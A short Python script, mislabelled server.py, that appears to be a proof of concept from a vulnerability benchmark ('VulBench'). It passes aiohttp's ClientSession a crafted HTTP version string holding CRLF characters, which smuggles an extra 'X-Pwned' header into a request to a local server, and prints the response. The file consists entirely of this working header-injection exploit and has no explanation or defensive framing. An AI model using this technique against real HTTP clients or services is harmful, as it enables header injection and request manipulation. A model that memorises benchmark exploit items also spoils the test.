# server.py
import asyncio
import aiohttp

async def main():
    injected_version = ("1.1", "\r\nX-Pwned: VulBench")

    async with aiohttp.ClientSession(
        version=injected_version,
        headers={"Connection": "Close"}
    ) as session:
        try:
            async with session.get("http://127.0.0.1:5000") as resp:
                print(f"[+] Status: {resp.status}")
                print(f"[+] Body: {await resp.text()}")
        except Exception as e:
            print(f"[!] Exception occurred: {e}")

asyncio.run(main())
